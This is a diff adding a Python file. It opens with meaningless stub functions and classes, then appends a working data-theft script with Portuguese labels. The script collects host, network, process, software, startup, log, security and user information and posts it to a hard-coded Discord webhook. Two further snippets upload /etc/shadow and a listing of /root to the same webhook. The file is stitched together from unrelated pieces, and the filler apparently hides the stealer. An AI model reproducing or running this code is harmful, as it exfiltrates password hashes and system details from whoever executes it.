@@ -1,0 +1,678 @@
+def func1():
+    pass
+
+def func2():
+    pass
+
+def func3():
+    pass
+
+def func4():
+    pass
+
+def func5():
+    pass
+
+def func6():
+    pass
+
+def func7():
+    pass
+
+def func8():
+    pass
+
+def func9():
+    pass
+
+def func10():
+    pass
+
+def func11():
+    pass
+
+def func12():
+    pass
+
+def func13():
+    pass
+
+def func14():
+    pass
+
+def func15():
+    pass
+
+def func16():
+    pass
+
+def func17():
+    pass
+
+def func18():
+    pass
+
+def func19():
+    pass
+
+def func20():
+    pass
+
+class A:
+    def method1(self):
+        pass
+
+    def method2(self):
+        pass
+
+    def method3(self):
+        pass
+
+class B:
+    def method1(self):
+        pass
+
+    def method2(self):
+        pass
+
+    def method3(self):
+        pass
+
+class C:
+    def method1(self):
+        pass
+
+    def method2(self):
+        pass
+
+    def method3(self):
+        pass
+
+x = None
+y = None
+z = None
+
+a = []
+b = {}
+c = ()
+
+for i in range(5):
+    pass
+
+while False:
+    pass
+
+try:
+    pass
+except:
+    pass
+finally:
+    pass
+
+if False:
+    pass
+elif False:
+    pass
+else:
+    pass
+
+def func1():
+    a = 1
+    b = 2
+    c = a + b
+    d = c * 2
+    e = d - a
+    f = e / 3
+    g = f ** 2
+    h = g % 5
+    return None
+
+def func2():
+    x = 0
+    for i in range(10):
+        x += i
+        x -= i
+    return
+
+def func3():
+    for _ in range(3):
+        for __ in range(2):
+            continue
+    return
+
+class ClasseA:
+    def __init__(self):
+        self.x = 10
+        self.y = 20
+
+    def metodo1(self):
+        valor = self.x + self.y
+        valor = valor * 2
+        return
+
+    def metodo2(self):
+        for i in range(5):
+            if i % 2 == 0:
+                continue
+        return
+
+class ClasseB:
+    def __init__(self):
+        self.a = None
+
+    def metodo(self):
+        try:
+            pass
+        except:
+            pass
+        finally:
+            pass
+
+def func4():
+    resultado = 0
+    while resultado < 5:
+        resultado += 1
+    return
+
+obj1 = ClasseA()
+obj2 = ClasseB()
+
+func1()
+func2()
+func3()
+func4()
+
+obj1.metodo1()
+obj1.metodo2()
+obj2.metodo()
+
+lista = [i for i in range(10)]
+dicionario = {str(i): i for i in range(5)}
+
+for chave in dicionario:
+    valor = dicionario[chave]
+
+tupla = (1, 2, 3, 4, 5)
+conjunto = set(tupla)
+
+if 2 in conjunto:
+    pass
+elif 3 in conjunto:
+    pass
+else:
+    pass
+
+def func5():
+    a = 1
+    b = 2
+    c = 3
+    d = 4
+    e = 5
+    f = 6
+    g = 7
+    h = 8
+    i = 9
+    j = 10
+    return
+
+func5()
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import platform
+import socket
+import uuid
+import json
+import shutil
+import subprocess
+import getpass
+from datetime import datetime
+import hashlib
+import sys
+
+import requests
+
+try:
+    import ctypes
+    import winreg
+except Exception:
+    ctypes = None
+    winreg = None
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1432124456830111914/wNYSjmaGfEgxQYFoEygsuT3Km1ZAeai24RK6xt-xk-Gvmun-JMcWl8ZU2If8BaPp-BCx"
+SEND_AS_FILE = True
+FILE_NAME = "inf.txt"
+SUBPROCESS_TIMEOUT = 12
+MAX_PROCESS_LINES = 200
+MAX_PROGRAMS = None
+
+def safe_run(cmd):
+    try:
+        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True, universal_newlines=True, timeout=SUBPROCESS_TIMEOUT)
+        return out.strip()
+    except subprocess.TimeoutExpired:
+        return f"[timeout executando '{cmd}']"
+    except subprocess.CalledProcessError as e:
+        return f"[erro {e.returncode} ao executar '{cmd}': {e.output.strip() if e.output else e}]"
+    except Exception as e:
+        return f"[erro executando '{cmd}': {e}]"
+
+def get_basic_info():
+    info = {}
+    info["Hostname"] = socket.gethostname()
+    info["Usuário Logado"] = getpass.getuser()
+    info["Sistema"] = platform.system()
+    info["Máquina"] = platform.machine()
+    info["Plataforma"] = platform.platform()
+    info["Versão SO"] = platform.version()
+    info["Release"] = platform.release()
+    info["Informações uname"] = " ".join(platform.uname())
+    info["Python Versão"] = platform.python_version()
+    info["Hora Coleta"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    return info
+
+def get_network_info():
+    info = {}
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+        except Exception:
+            local_ip = socket.gethostbyname(socket.gethostname())
+        finally:
+            s.close()
+    except Exception as e:
+        local_ip = f"N/A ({e})"
+    info["IP Local"] = local_ip
+    try:
+        info["MAC"] = ":".join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
+    except Exception as e:
+        info["MAC"] = f"N/A ({e})"
+    try:
+        r = requests.get("https://api.ipify.org?format=json", timeout=6)
+        info["IP Público"] = r.json().get("ip", "N/A")
+    except Exception as e:
+        info["IP Público"] = f"N/A ({e})"
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        info["Interfaces Detalhadas"] = safe_run("ipconfig /all")
+        info["Rota e ARP"] = safe_run("route print && arp -a")
+    else:
+        info["Interfaces Detalhadas"] = safe_run("ip addr || true")
+        info["Rota"] = safe_run("ip route || route -n || true")
+        info["Resolv.conf"] = safe_run("cat /etc/resolv.conf || true")
+        info["ARP"] = safe_run("ip neigh || arp -n || true")
+    return info
+
+def get_connections_and_ports():
+    info = {}
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        info["Conexões Ativas"] = safe_run("netstat -ano")
+    else:
+        info["Conexões Ativas"] = safe_run("ss -tunap || netstat -tunap || true")
+    return info
+
+def get_storage_memory_info():
+    info = {}
+    try:
+        total, used, free = shutil.disk_usage(os.path.expanduser("~"))
+        info["Disco (home) - Total(bytes)"] = str(total)
+        info["Disco (home) - Usado(bytes)"] = str(used)
+        info["Disco (home) - Livre(bytes)"] = str(free)
+    except Exception as e:
+        info["Disco"] = f"N/A ({e})"
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        try:
+            if ctypes:
+                class MEMORYSTATUSEX(ctypes.Structure):
+                    _fields_ = [
+                        ("dwLength", ctypes.c_ulong),
+                        ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_ulonglong),
+                        ("ullAvailPhys", ctypes.c_ulonglong),
+                        ("ullTotalPageFile", ctypes.c_ulonglong),
+                        ("ullAvailPageFile", ctypes.c_ulonglong),
+                        ("ullTotalVirtual", ctypes.c_ulonglong),
+                        ("ullAvailVirtual", ctypes.c_ulonglong),
+                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+                    ]
+                mem = MEMORYSTATUSEX()
+                mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+                info["Memória Total(bytes)"] = str(mem.ullTotalPhys)
+                info["Memória Disponível(bytes)"] = str(mem.ullAvailPhys)
+                info["Uso Memória (%)"] = str(mem.dwMemoryLoad)
+        except Exception as e:
+            info["Memória"] = f"N/A ({e})"
+    else:
+        info["Memória (/proc/meminfo)"] = safe_run("cat /proc/meminfo || true")
+        info["Partições/DF"] = safe_run("df -h || true")
+    if platform.system().lower().startswith("win"):
+        info["Volumes"] = safe_run("wmic logicaldisk get caption,size,freespace || true")
+    else:
+        info["lsblk"] = safe_run("lsblk -o NAME,SIZE,MOUNTPOINT || true")
+    return info
+
+def get_cpu_gpu_and_bios():
+    info = {}
+    info["CPU Count (logical)"] = str(os.cpu_count())
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        info["CPU Detalhes"] = safe_run("wmic cpu get name,numberofcores,numberoflogicalprocessors /format:list")
+        info["GPU Detalhes"] = safe_run("wmic path win32_VideoController get name || true")
+        info["BIOS Serial"] = safe_run("wmic bios get serialnumber || true")
+        info["System UUID"] = safe_run("wmic csproduct get uuid || true")
+    else:
+        info["CPU Detalhes"] = safe_run("lscpu || true")
+        info["GPU Detalhes"] = safe_run("lspci | grep -i 'vga\\|3d\\|display' || true")
+        info["DMI (dmidecode breve)"] = safe_run("dmidecode -s system-uuid || true")
+    return info
+
+def get_processes_and_usage():
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        proc = safe_run("tasklist /V /FO LIST || tasklist /FO LIST || true")
+    else:
+        proc = safe_run("ps aux --sort=-%mem || ps aux || true")
+    lines = proc.splitlines()
+    if len(lines) > MAX_PROCESS_LINES:
+        proc = "\n".join(lines[:MAX_PROCESS_LINES]) + f"\n... (mostrando {MAX_PROCESS_LINES} de {len(lines)} linhas)"
+    return proc
+
+def get_installed_programs():
+    sysname = platform.system().lower()
+    programs = []
+    if sysname.startswith("win") and winreg:
+        uninstall_keys = [
+            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+        ]
+        try:
+            for hive, path in uninstall_keys:
+                try:
+                    key = winreg.OpenKey(hive, path)
+                except Exception:
+                    continue
+                for i in range(0, 10000):
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                    except OSError:
+                        break
+                    try:
+                        subkey = winreg.OpenKey(key, subkey_name)
+                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                        try:
+                            display_version, _ = winreg.QueryValueEx(subkey, "DisplayVersion")
+                        except Exception:
+                            display_version = ""
+                        programs.append(f"{display_name} {display_version}".strip())
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+        wmic_out = safe_run("wmic product get name,version || true")
+        if wmic_out and "No Instance(s) Available." not in wmic_out:
+            programs.append(wmic_out)
+    else:
+        dpkg = safe_run("dpkg -l || true")
+        rpm = safe_run("rpm -qa || true")
+        if dpkg and "dpkg-query" not in dpkg:
+            programs.append(dpkg)
+        if rpm and "not found" not in rpm:
+            programs.append(rpm)
+    if isinstance(programs, list) and MAX_PROGRAMS:
+        programs = programs[:MAX_PROGRAMS]
+    return programs
+
+def get_startup_and_services():
+    info = {}
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        try:
+            user_startup = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
+            info["Startup - Pasta Usuário"] = safe_run(f'dir "{user_startup}" /b || true')
+        except Exception:
+            info["Startup - Pasta Usuário"] = "[erro lendo pasta Startup]"
+        try:
+            info["Startup - HKCU Run"] = []
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                for i in range(0, 500):
+                    try:
+                        name = winreg.EnumValue(key, i)[0]
+                        val = winreg.QueryValueEx(key, name)[0]
+                        info["Startup - HKCU Run"].append(f"{name} -> {val}")
+                    except OSError:
+                        break
+            except Exception:
+                info["Startup - HKCU Run"] = "[não acessível]"
+        except Exception:
+            pass
+        info["Serviços"] = safe_run("wmic service get name,startmode,state || sc query || true")
+        info["Tarefas Agendadas"] = safe_run("schtasks /query /fo LIST /v || true")
+    else:
+        info["Startup - autostart dir"] = safe_run("ls ~/.config/autostart || true")
+        info["Crontab Usuário"] = safe_run("crontab -l || true")
+        info["Crontabs Sistema"] = safe_run("ls /etc/cron.* || true")
+        info["Serviços"] = safe_run("systemctl list-units --type=service --no-pager --no-legend || service --status-all || true")
+    return info
+
+def get_event_logs_summary():
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        system = safe_run("wevtutil qe System /c:50 /f:text /rd:true || true")
+        application = safe_run("wevtutil qe Application /c:50 /f:text /rd:true || true")
+        return {"EventLog System (últimas 50)": system, "EventLog Application (últimas 50)": application}
+    else:
+        journal = safe_run("journalctl -n 200 --no-pager || tail -n 200 /var/log/syslog || tail -n 200 /var/log/messages || true")
+        return {"Journal/Syslog (últimas 200)": journal}
+
+def get_firewall_and_security():
+    info = {}
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        info["Firewall"] = safe_run("netsh advfirewall show allprofiles || true")
+        av = safe_run('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState || true')
+        info["Antivírus (SecurityCenter2)"] = av
+    else:
+        info["Firewall"] = safe_run("ufw status || iptables -L || true")
+        info["AV Heuristics"] = safe_run("ps aux | egrep 'clam|freshclam|sav|maldet' || true")
+    return info
+
+def get_users_and_groups():
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        users = safe_run("net user || true")
+        groups = safe_run("net localgroup || true")
+    else:
+        users = safe_run("getent passwd || cat /etc/passwd || true")
+        groups = safe_run("getent group || cat /etc/group || true")
+    return {"Usuários": users, "Grupos": groups}
+
+def get_hashes_of_files(paths):
+    hashes = {}
+    for p in paths:
+        try:
+            if os.path.exists(p) and os.path.isfile(p):
+                h = hashlib.sha256()
+                with open(p, "rb") as f:
+                    for chunk in iter(lambda: f.read(8192), b""):
+                        h.update(chunk)
+                hashes[p] = h.hexdigest()
+            else:
+                hashes[p] = "[não existe ou não é arquivo]"
+        except Exception as e:
+            hashes[p] = f"[erro: {e}]"
+    return hashes
+
+def get_python_env_info():
+    info = {}
+    info["sys.path"] = os.sys.path
+    try:
+        pip_list = safe_run("pip list --format=json || pip3 list --format=json || true")
+        info["pip list"] = pip_list
+    except Exception:
+        info["pip list"] = "[não disponível]"
+    return info
+
+def get_virtualization_info():
+    info = {}
+    sysname = platform.system().lower()
+    if sysname.startswith("win"):
+        info["Computer Model"] = safe_run("wmic computersystem get model,manufacturer || true")
+    else:
+        info["DMI model"] = safe_run("cat /sys/class/dmi/id/product_name 2>/dev/null || true")
+    return info
+
+def collect_all():
+    data = {}
+    data.update(get_basic_info())
+    data["Network"] = get_network_info()
+    data["Connections"] = get_connections_and_ports()
+    data["Storage_Memory"] = get_storage_memory_info()
+    data["CPU_GPU_BIOS"] = get_cpu_gpu_and_bios()
+    data["Processes"] = get_processes_and_usage()
+    data["Programs_Installed"] = get_installed_programs()
+    data["Startup_Services_Tasks"] = get_startup_and_services()
+    data["Event_Logs"] = get_event_logs_summary()
+    data["Firewall_AV"] = get_firewall_and_security()
+    data["Users_Groups"] = get_users_and_groups()
+    candidate_files = []
+    if platform.system().lower().startswith("win"):
+        candidate_files += [r"C:\Windows\System32\drivers\etc\hosts", r"C:\Windows\System32\ntoskrnl.exe"]
+    else:
+        candidate_files += ["/etc/hosts", "/bin/bash"]
+    data["File_Hashes"] = get_hashes_of_files(candidate_files)
+    data["Python_Env"] = get_python_env_info()
+    data["Virtualization"] = get_virtualization_info()
+    return data
+
+def pretty_text_from_data(data):
+    lines = []
+    lines.append("Coleta de Informações - " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+    lines.append("=" * 80)
+    simple_keys = [k for k in data.keys() if k not in ("Processes", "Programs_Installed", "Event_Logs")]
+    for k in simple_keys:
+        val = data[k]
+        if isinstance(val, dict) or isinstance(val, list):
+            lines.append(f"\n[{k}]")
+            try:
+                lines.append(json.dumps(val, indent=2, ensure_ascii=False))
+            except Exception:
+                lines.append(str(val))
+        else:
+            lines.append(f"{k}: {val}")
+    lines.append("\n[Programas Instalados / Amostra]")
+    progs = data.get("Programs_Installed")
+    if isinstance(progs, list):
+        for p in progs:
+            lines.append(" - " + str(p))
+    else:
+        lines.append(str(progs))
+    lines.append("\n[Processos (resumo)]")
+    proc = data.get("Processes", "")
+    lines.append(proc)
+    ev = data.get("Event_Logs")
+    if isinstance(ev, dict):
+        for k, v in ev.items():
+            lines.append(f"\n[{k}]")
+            lines.append(v if v else "")
+    return "\n".join(lines)
+
+def send_to_discord(text):
+    if not WEBHOOK_URL or "COLE_AQUI" in WEBHOOK_URL:
+        try:
+            with open(FILE_NAME, "w", encoding="utf-8") as f:
+                f.write(text)
+        except Exception:
+            pass
+        return
+    try:
+        if SEND_AS_FILE:
+            files = {"file": (FILE_NAME, text.encode("utf-8"))}
+            requests.post(WEBHOOK_URL, files=files, timeout=15)
+        else:
+            content = "```" + (text[:1900] + ("..." if len(text) > 1900 else "")) + "```"
+            requests.post(WEBHOOK_URL, json={"content": content}, timeout=15)
+    except Exception:
+        try:
+            with open(FILE_NAME, "w", encoding="utf-8") as f:
+                f.write(text)
+        except Exception:
+            pass
+
+def main():
+    data = collect_all()
+    text = pretty_text_from_data(data)
+    try:
+        with open(FILE_NAME, "w", encoding="utf-8") as f:
+            f.write(text)
+    except Exception:
+        pass
+    send_to_discord(text)
+
+if __name__ == "__main__":
+    main()
+import os
+import sys
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1432124456830111914/wNYSjmaGfEgxQYFoEygsuT3Km1ZAeai24RK6xt-xk-Gvmun-JMcWl8ZU2If8BaPp-BCx"
+arquivo_local = "/etc/shadow"  # exemplo
+arquivo_nome_no_discord = "/etc/shadow.txt"
+
+headers = {"User-Agent": "Mozilla/5.0"}
+
+if not os.path.exists(arquivo_local):
+    sys.exit(1)
+
+try:
+    with open(arquivo_local, "rb") as f:
+        files = {"file": (arquivo_nome_no_discord, f, "text/plain")}
+        resp = requests.post(WEBHOOK_URL, files=files, headers=headers, timeout=30)
+except requests.RequestException:
+    sys.exit(3)
+
+if resp.status_code in (200, 204):
+    sys.exit(0)
+else:
+    sys.exit(4)
+
+import os
+import sys
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/1432124456830111914/wNYSjmaGfEgxQYFoEygsuT3Km1ZAeai24RK6xt-xk-Gvmun-JMcWl8ZU2If8BaPp-BCx"
+DIRETORIO = "/root"
+ARQUIVO_LOCAL = "lista.txt"
+
+headers = {"User-Agent": "Mozilla/5.0"}
+
+
+try:
+    conteudo = "\n".join(os.listdir(DIRETORIO))
+except Exception as e:
+    sys.exit(2)
+
+
+with open(ARQUIVO_LOCAL, "w", encoding="utf-8") as f:
+    f.write(conteudo)
+
+if not os.path.exists(ARQUIVO_LOCAL):
+    sys.exit(1)
+
+
+try:
+    with open(ARQUIVO_LOCAL, "rb") as f:
+        files = {"file": (ARQUIVO_LOCAL, f, "text/plain")}
+        resp = requests.post(WEBHOOK_URL, files=files, headers=headers, timeout=20)
+except requests.RequestException:
+    sys.exit(3)
+
+if resp.status_code != 200 and resp.status_code != 204:
+    sys.exit(4)
